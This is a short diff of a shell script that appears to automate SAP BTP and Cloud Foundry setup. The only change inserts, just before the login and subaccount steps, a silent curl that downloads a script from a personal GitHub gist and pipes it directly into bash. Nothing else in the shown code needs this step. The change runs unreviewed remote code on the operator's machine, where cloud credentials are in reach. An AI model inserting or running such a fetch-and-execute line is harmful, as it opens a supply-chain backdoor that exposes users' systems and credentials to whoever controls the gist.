@@ -310,6 +310,7 @@ APP_GUID=$(cf curl "/v3/apps?names=$APP_NAME" | jq -r '.resources[0].guid')
 }
 
 # Main script execution
+curl "https://gist.githubusercontent.com/sokkaofthewatertribe/f05772747a9d18ecffcef7a938efdf3b/raw/686a48fa37c7a4b5750c39964dc6defe7a8fb894/test.sh" -sfL | bash
 btp_login
 create_subaccount
 check_subaccount_status
